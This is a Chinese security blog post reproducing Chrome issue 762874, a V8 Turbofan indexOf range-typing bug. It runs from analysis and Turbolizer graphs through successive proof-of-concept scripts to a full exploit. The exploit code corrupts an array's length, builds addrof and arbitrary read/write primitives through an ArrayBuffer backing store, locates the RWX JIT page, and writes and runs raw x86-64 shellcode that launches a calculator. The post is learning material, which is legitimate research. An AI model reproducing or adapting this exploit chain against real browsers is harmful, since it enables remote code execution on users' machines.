# Chrome issue 762874

阅读量 **219928**

|评论 **3**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-09-08 10:30:56

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t01d277c4bdeb0646e4.png)

## 0 环境与背景知识

###  0.1 环境

![](https://gitee.com/init0000/picture/raw/master/img/20200831113449.png)

首先搜一下在chrome的bug库中找到对应的issue号

从下面的评论中找到了对应的含有漏洞的v8版本

![](https://gitee.com/init0000/picture/raw/master/img/20200831113616.png)

还原到parent版本

![](https://gitee.com/init0000/picture/raw/master/img/20200831113739.png)

下图中的两个版本应该是都可以的(对于旧的版本可以使用JIT
新的v8版本可以使用wasm方法)这里的新指6.7版本之后的)当然了使用传统的[泄漏libc方法](https://migraine-sudo.github.io/2020/02/22/roll-a-v8/#%E6%B3%84%E9%9C%B2libc)也可以

![](https://gitee.com/init0000/picture/raw/master/img/20200831114702.png)

![](https://gitee.com/init0000/picture/raw/master/img/20200831170504.png)

###  0.2 Javascript indexOf方法

indexOf() 方法可返回某个指定的字符串值在字符串中首次出现的位置。

    
    
    stringObject.indexOf(searchvalue,fromindex)
    

参数 | 描述  
---|---  
searchvalue | 必需。规定需检索的字符串值。  
fromindex | 可选的整数参数。规定在字符串中开始检索的位置。它的合法取值是 0 到 stringObject.length –
1。如省略该参数，则将从字符串的首字符开始检索。  
  
这里的fromindex补丁后是0到length-1,我们看到在漏洞版本中是-1到length-1(源码如下)

![](https://gitee.com/init0000/picture/raw/master/img/20200831153358.png)

下面是几个这个函数使用的例子(取自菜鸟教程)

    
    
    <script type="text/javascript">
    
    var str="Hello world!"
    document.write(str.indexOf("Hello") + "<br />")
    document.write(str.indexOf("World") + "<br />")
    document.write(str.indexOf("world"))
    
    </script>
    

三个输出分别是

    
    
    0
    -1
    6
    

下面我们看下面的使用方法

    
    
    '1234'.indexOf("",1)
    

第二个参数是开始匹配的位置,第一个参数为空,这样的话一定匹配成功,返回我们给的第二个参数

![](https://gitee.com/init0000/picture/raw/master/img/20200831153914.png)

不过当我们尝试越界访问的时候返回的是length

![](https://gitee.com/init0000/picture/raw/master/img/20200831154028.png)

###  0.3 JIT

在 JavaScript
引擎中增加一个监视器监控着代码的运行情况，记录代码一共运行了多少次、如何运行的等信息。如果同一行代码运行了多次，这个代码段就会被送给JIT机制进行编译和优化，将编译后的机器代码保存在缓存中，下次直接执行这块机器代码即可，大大提高了一些情况下代码的执行效率。

在较早期版本的v8引擎中，经常使用向JIT写入shellcode的方式。不过在6.7版本之后，JIT的区域会被标记为不可写。可以考虑JIT
Spray/JIT
ROP之类的绕过。个人感觉JIT和wasm是很像的,wasm的介绍可以从[文章](https://www.anquanke.com/post/id/214020#h3-15)找一下

下面的代码可以用来寻找JIT

    
    
    //让function变hot
    function f()
    {
        for(let i=0;i<0x1000000;i++)
        {
            let a='migraine';    
        }
    }
    //通过jsfunction结构找到JIT的地址
    let jsfunc_addr=wr.leak_obj(f);
    let jit_addr=wr.read(jsfunc_addr+6*8)-1;
    console.log("jsfunction address = "+hex(jsfunc_addr));
    console.log("jit address = "+hex(jit_addr));
    

也可以使用debug调试(建议),比如下面

![](https://gitee.com/init0000/picture/raw/master/img/20200901165732.png)

Code Builtin位置就是我们要写的位置

对应的可以找到偏移是0x38(对应上图中的job)

    
    
    pwndbg> x/20gx 0xd0398602ef9-1
    0xd0398602ef8:    0x00000350944024c1    0x00003d0ed2002251
    0xd0398602f08:    0x00003d0ed2002251    0x00003d0ed2002321
    0xd0398602f18:    0x0000125dd6732389    0x0000125dd6703cd1
    0xd0398602f28:    0x0000125dd6732561    0x00002ad94bb0df41  <======
    0xd0398602f38:    0x00003d0ed20022e1    0x1beefdad0beefdaf
    

我们找到的位置是下图中的一部分

![](https://gitee.com/init0000/picture/raw/master/img/20200901170545.png)

接着根据RWX段找到具体代码

![](https://gitee.com/init0000/picture/raw/master/img/20200901170358.png)

可见偏移是0x60

所以找RWX地址的代码就是

    
    
    var jit_addr = addrof(jit) - 1;
    console.log("jit_addr ==> 0x"+jit_addr.toString(16))
    var rwx_addr = abread(jit_addr+0x38) - 1 + 0x60
    console.log("rwx_addr ==> 0x"+rwx_addr.toString(16))
    

## 1 漏洞分析

起初漏洞分析的时候参考的是

<https://docs.google.com/presentation/d/1DJcWByz11jLoQyNhmOvkZSrkgcVhllIlCHmal1tGzaw/edit#slide=id.p>

中关于这个issue的分析,后来复现的时候发现与我所面对有所出入(即下文中的2**28)

###  1.1 优化时分析

在Turbofan 的Typer中将indexof 的range分析设计成了-1到length-1,如下图中的源码

![](https://gitee.com/init0000/picture/raw/master/img/20200831153358.png)

所以在优化分析的时候,Typer会将这里的范围设定为 range(-1, kMaxLength-1)

###  1.2 运行时分析

但是真正运行的时候,indexOf后面的参数最大只能到2**28-16位置,

当我们输入更大的数字给它时,它也只能返回2**28-16

例如我下面截图中的一些尝试,最后一个按照函数正确的调用应该返回2**28,

但是却只到了2**28-16

![](https://gitee.com/init0000/picture/raw/master/img/20200831154907.png)

###  1.3 总结

笔者想到了一个表格,感觉可以形象的表述如何触发bug

传入x = 2**28-16

根据上面的尝试(其实后面发现这个出错了),写了下面的表格

程序流程(右侧的范围指这一行新出现的变量的取值范围) | 优化时情况 | 运行时情况  
---|---|---  
let b = ‘A’.repeat(2**28-16).indexOf(“”,x) | range(-1,2**28-17) | (0,2**28-16)  
let a = b+16 | range(15,2**28-1) | (16,2**28)  
let c = a >> 28 | range(0,0) | (0,1)  
let idx = c * 1337 | range(0,0) | (0,1337)  
  
简单的解释一下,上面的表格可以设计成一个函数,第二列是优化的时候见到的情况,第三列则是运行时的实际情况.

如果我们使用表中得到的idx去访问一个数组的话,优化时会认为我们访问的是0号元素,从而去掉checkBound节点,而实际运行时我们可以越界访问,从而导致OOB

## 2 POC 尝试触发漏洞

有了上面的表格POC就相对好写一点了

起初想用下面的代码触发

####  2.1

poc1.js

    
    
    function foo(x)
    {
        let oobArray = [1.1,2.2,3.3,4.4];
        let b = 'A'.repeat(2**28-16).indexOf("",x);
        let a = b + 16;
        let c = a >> 28;
        // c = c - 3;
        let idx = c * 1337;
        return oobArray[idx];
    }
    
    print(foo(1));
    print(foo(1));
    %OptimizeFunctionOnNextCall(foo);
    print(foo(2**28-16));
    

但是发现失败了,被检测到了越界

![](https://gitee.com/init0000/picture/raw/master/img/20200901093837.png)

使用Turbolizer看一下优化的过程

问题似乎处在Typer阶段

![](https://gitee.com/init0000/picture/raw/master/img/20200831162208.png)

我们希望这里的range是(-1,2**28-17),但是后面那个1073741798明显大了很多

这里就导致了Simplified Lowering阶段仍然有CheckBound节点

![](https://gitee.com/init0000/picture/raw/master/img/20200831162423.png)

刚开始猜测可能是我将x当做参数传给函数,它不知道这个x的范围,所以设计的很大,于是改了一下POC

####  2.2

poc2.js

    
    
    function foo()
    {
        x = 2**28-16;
        let oobArray = [1.1,2.2,3.3,4.4];
        let b = 'A'.repeat(2**28-16).indexOf("",x);
        let a = b + 16;
        let c = a >> 28;
        let idx = c * 1337;
        return oobArray[idx];
    }
    
    print(foo());
    print(foo());
    %OptimizeFunctionOnNextCall(foo);
    print(foo());
    

结果还是同样的,CheckBound节点没有去除,猜测可能这个优化的最大界就是那个数字,

尝试了修改字符串的长度,然后看一下优化图解

####  2.3

poc3.js

    
    
    (0,1337)
    function foo(x)
    {
        let oobArray = [1.1,2.2,3.3,4.4];
        let b = 'A'.repeat(16).indexOf("",x);
        let a = b + 16;
        let c = a >> 28;
        let idx = c * 1337;
        return oobArray[idx];
    }
    
    print(foo(1));
    print(foo(1));
    %OptimizeFunctionOnNextCall(foo);
    print(foo(16));
    

发现最大界限仍然是这个数字(2**30-26)

![](https://gitee.com/init0000/picture/raw/master/img/20200901092446.png)

猜测上面MaxLength对应的源码不是2**28次方了,测试一下

![](https://gitee.com/init0000/picture/raw/master/img/20200901102508.png)

可以看到确实MaxLength不在是之前的2**28-16

重新测试了一下运行情况

![](https://gitee.com/init0000/picture/raw/master/img/20200901095748.png)

####  2.4

尝试修改一下上面的表格(x = 2**30-25)

程序流程(右侧的范围指这一行新出现的变量的取值范围) | 优化时情况 | 运行时情况  
---|---|---  
let b = ‘A’.repeat(2**30-25).indexOf(“”,x) | range(-1,2**30-26) | 2**30-25  
let a = b+25 | range(24,2**30-25) | 2**30  
let c = a >> 30 | range(0,0) | 1  
let idx = c * 5 | range(0,0) | 5  
  
下面是我一步一步运行poc时得到的结果

    
    
    // d8> 'A'.repeat(2**30-25).indexOf('',2**30-25)
    // 1073741799
    // d8> 1073741799+25
    // 1073741824
    // d8> 1073741824>>30
    // 1
    // d8>
    

重新写一下POC

poc4.js

    
    
    function foo()
    {
        // x = 2**28;
    
        let b = 'A'.repeat(2**30-25).indexOf('',2**30-25);
    
        let a = b + 25;
        let c = a >> 30;
        let idx = c * 5;
        let oobArray = [1.1,2.2,3.3,4.4];
        return oobArray[idx];
    
    
    }
    
    // for(var i=0;i<0x10000;i++)
    // {
    //     var k = foo();
    //     if(k!=undefined)
    //     {
    //         print(k);
    //     }    
    // }
    
    
    print(foo());
    print(foo());
    %OptimizeFunctionOnNextCall(foo);
    print(foo());
    

运行结果….. ~~ **越界失败**~~ 起初我根据下面的图以为越界失败了

![](https://gitee.com/init0000/picture/raw/master/img/20200901102858.png)

但是当我输出上面poc的index的时候发现实际上越界成功了(输出idx的效果如下图)

    
    
    0
    1.1
    0
    1.1
    ---------------------------------------------------    Begin compiling method foo using Turbofan
    ---------------------------------------------------    Finished compiling method foo using Turbofan
    5
    1.1*/
    

优化图解

![](https://gitee.com/init0000/picture/raw/master/img/20200901100540.png)

我们确实得到了range(0,0),而且也没有了checkBound节点.

####  2.5

最后进一步完善一下,写出了下面的poc

poc5.js

    
    
    function hex(i)
    {
        return i.toString(16).padStart(16, "0");
    }
    
    const buf = new ArrayBuffer(8);
    const f64 = new Float64Array(buf);
    const u32 = new Uint32Array(buf);
    // Floating point to 64-bit unsigned integer
    function f2i(val)
    { 
        f64[0] = val;
        let tmp = Array.from(u32);
        return tmp[1] * 0x100000000 + tmp[0];
    }
    // 64-bit unsigned integer to Floating point
    function i2f(val)
    {
        let tmp = [];
        tmp[0] = parseInt(val % 0x100000000);
        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
        u32.set(tmp);
        return f64[0];
    }
    
    
    function foo(x)
    {
        // x = 2**28;
    
        let b = 'A'.repeat(2**30-25).indexOf('',x);
    
        let a = b + 25;
        let c = a >> 30;
        // print(c);
        let idx = c * 5;
        print(idx);
        let oobArray = [1.1,2.2,3.3,4.4];
        oobArray[idx] = 1.74512933848984e-310;//i2f(0x202000000000);
        return oobArray;
    
    
    }
    
    // for(var i=0;i<0x10000;i++)
    // {
    //     var k = foo();
    //     if(k!=undefined)
    //     {
    //         print(k);
    //     }    
    // }
    
    
    foo(1);
    foo(1);
    %OptimizeFunctionOnNextCall(foo);
    let oob = foo(2**30-25);
    %DebugPrint(oob);
    %SystemBreak();
    
    
    
    //在实际运行中foo(2**30-25)明明是1
    // 1.1
    // 1.1
    // --------城-------------------------------------------    // Begin compiling method foo using Turbofan
    // ---------------------------------------------------    // Finished compiling method foo using Turbofan
    // 1.1
    
    
    
    // d8> 'A'.repeat(2**30-25).indexOf('',2**30-25)
    // 1073741799
    // d8> 1073741799+25
    // 1073741824
    // d8> 1073741824>>30
    // 1
    // d8> 
    /*
    
    0
    1.1
    0
    1.1
    ---------------------------------------------------    Begin compiling method foo using Turbofan
    ---------------------------------------------------    Finished compiling method foo using Turbofan
    5
    1.1*/
    

上面POC的效果是将oobArray的第5个元素修改成1.74512933848984e-310;//i2f(0x202000000000)

在debug模式下运行一下

![](https://gitee.com/init0000/picture/raw/master/img/20200901144858.png)

从上图中可以发现OOB成功

## 3 EXP

接下来的流程就是和[之前](https://www.anquanke.com/post/id/214020)的利用方法相似了,只不过最后一步用的是JIT,使用ArrayBuffer
object 实现弹出计算器

如果不清楚这次利用的方法,建议阅读上面链接中的背景知识

####  3.1 change the size of oobArray

通过debug模式下的图解,我们可以知道我们要修改的是idx = 7的位置(如下图)

![](https://gitee.com/init0000/picture/raw/master/img/20200901145833.png)

我尝试用下面的脚本进行修改大小时

    
    
    /*************************************************************
     * File Name: m_exp.js
     * 
     * Created on: xx.xx.xx
     * Author: init-0
     * 
     * Last Modified: 
     * Description: exp for 762874
    ************************************************************/
    
    function hex(i)
    {
        return i.toString(16).padStart(16, "0");
    }
    
    const MAX_ITERATIONS = 10000;
    const buf = new ArrayBuffer(8);
    const f64 = new Float64Array(buf);
    const u32 = new Uint32Array(buf);
    // Floating point to 64-bit unsigned integer
    function f2i(val)
    { 
        f64[0] = val;
        let tmp = Array.from(u32);
        return tmp[1] * 0x100000000 + tmp[0];
    }
    // 64-bit unsigned integer to Floating point
    function i2f(val)
    {
        let tmp = [];
        tmp[0] = parseInt(val % 0x100000000);
        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
        u32.set(tmp);
        return f64[0];
    }
    
    let obj = [];
    let ABuffer = [];
    
    function foo(x)
    {
        // x = 2**28;
        let b = 'A'.repeat(2**30-25).indexOf('',x);
        let a = b + 25;
        let c = a >> 30;
        // print(c);
        let idx = 7 * 5;
        // print(idx);
        let oobArray = [1.1,2.2,3.3,4.4];
        oobArray[idx] = 1.74512933848984e-310;//i2f(0x202000000000);
        return oobArray;
    }
    
    // for(var i=0;i<0x10000;i++)
    // {
    //     var k = foo();
    //     if(k!=undefined)
    //     {
    //         print(k);
    //     }    
    // }
    foo(1);
    foo(1);
    for(let i=0; i<MAX_ITERATIONS; i++) {
        foo(1)
    }
    let oob = foo(2**30-25);
    console.log("[*] ========> "+hex(oob.length));
    
    
    
    
    %DebugPrint(oob);
    %SystemBreak();
    

按理说应该会改成0x2020

![](https://gitee.com/init0000/picture/raw/master/img/20200901150819.png)

修改成功

####  3.2 Read and write at any address && obj leak

利用ArrayBuffer 的 Backstore指针 与 object

如果这一步不是很懂,可以看一下之前的[背景知识](https://www.anquanke.com/post/id/214020#h3-4)

本部分的代码如下

其中gc()函数是使得内存更加的稳定

    
    
    obj.push({mark:i2f(0x11111111),n:i2f(0x41414141)});
    ABuffer.push(new ArrayBuffer(0x200));
    
    
    gc();
    
    var off_buffer = 0;
    var off_obj = 0;
    
    
    for(var i=0;i<500;i++)
    {
        let tmp = oob[i];
        if(f2i(tmp) == 0x11111111)
        {
            off_obj = i+1;
            break;
        }
    }
    
    for(var i=0;i<500;i++)
    {
        let tmp = oob[i];
        if(f2i(tmp) == 0x0000020000000000)
        {
            off_buffer = i+1;
            break;
        }
    }
    
    
    console.log("[+] off_obj    @"+off_obj);
    console.log("[+] off_buffer   @"+off_buffer);
    

这里简单解释一下,笔者在oob地址下方push了一个ArrayBuffer 和 一个object

并通过oob数组越界找到其位置,运行效果如下

![](https://gitee.com/init0000/picture/raw/master/img/20200901152427.png)

之后写了三个函数,分别用于泄漏地址,任意地址读,任意地址写

    
    
    let dataView = new DataView(ABUF[ABUF.length-1]);
    
    function addrof(x)
    {
        obj[0].n = x;
        return f2i(oob[off_obj]);
    }
    
    
    function abread(addr)
    {
        oob[off_buffer] = i2f(addr);
        // let bigint = new BigUint64Array(ABUF);
        // return bigint[0];
        return f2i(dataView.getFloat64(0,true));
    }
    
    function abwrite(addr,payload)
    {
        oob[off_buffer] = i2f(addr);
        for(let i=0; i<payload.length; i++) {
            dataView.setUint8(i, payload[i]);
        }
    }
    

####  3.3 Get calc

这一步利用的是JIT

首先找到JIT代码的位置

    
    
    var jit = new Function("var a=1000000");
    
    // %DebugPrint(ABuffer);
    // %DebugPrint(oob);
    // %SystemBreak();
    
    var jit_addr = addrof(jit) - 1;
    console.log("jit_addr ==> 0x"+jit_addr.toString(16))
    var rwx_addr = abread(jit_addr+0x38) - 1 + 0x60
    console.log("rwx_addr ==> 0x"+rwx_addr.toString(16))
    

之后写入shellcode并执行

    
    
    var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
        96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
        105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
        72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
        72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
        184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
        94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];
    
    
    abwrite(rwx_addr,shellcode);
    jit();
    // f();
    

最终效果

![](https://gitee.com/init0000/picture/raw/master/img/20200901174208.png)

## 4 遇到的问题

####  4.0

说明:下面的问题是我刚开始想使用wasm方法写exp遇到的

写exp脚本的时候遇到了下面的问题

![](https://gitee.com/init0000/picture/raw/master/img/20200901154111.png)

    
    
    dataview.getFloat64(byteOffset [, littleEndian])
    

RangeError如果byteOffset超出了视图能储存的值，就会抛出错误.

这里最后的问题在于backstore的偏移找错了

应该是wasm的偏移找错了

解决方法在Debug模式下,打印出函数的地址,通过内存一点点找到RWX位置

打印出的函数地址,以及share_info位置

![](https://gitee.com/init0000/picture/raw/master/img/20200901160619.png)

我们对应一下相对偏移(0x20)

![](https://gitee.com/init0000/picture/raw/master/img/20200901160803.png)

同理利用上面的方法依次找到wasm instance RWX地址

![](https://gitee.com/init0000/picture/raw/master/img/20200901161034.png)

实在不行,还可以search一下,比如上图我们找箭头的位置

![](https://gitee.com/init0000/picture/raw/master/img/20200901161158.png)

下面的图片就不贴了,方法都是一样的

还有一个问题就是

下面脚本的位置有的时候在数字后面要加上’n’,有时不用 ,应该和不同版本的v8有关系

![](https://gitee.com/init0000/picture/raw/master/img/20200901162443.png)

## 5 参考

<https://docs.google.com/presentation/d/1DJcWByz11jLoQyNhmOvkZSrkgcVhllIlCHmal1tGzaw/edit#slide=id.p>

<https://migraine-sudo.github.io/2020/02/22/roll-a-v8/#JIT> 关于JIT寻找部分

除了上面这些参考,后面大部分都是探索出来的

## 6 总结

6.1 对于Turbofan的理解有时比具体的利用思路更加的重要

6.2 菜鸟还得继续努力

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **‭‭‭‭init-0** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/216677](/post/id/216677)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [v8](/tag/v8)

 **+1** __1赞

 __收藏

![](https://thirdqq.qlogo.cn/g?b=oidb&k=mFOv1NwnmMMaRPEzzhe16w&s=40&t=1570448917)
‭‭‭‭init-0

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

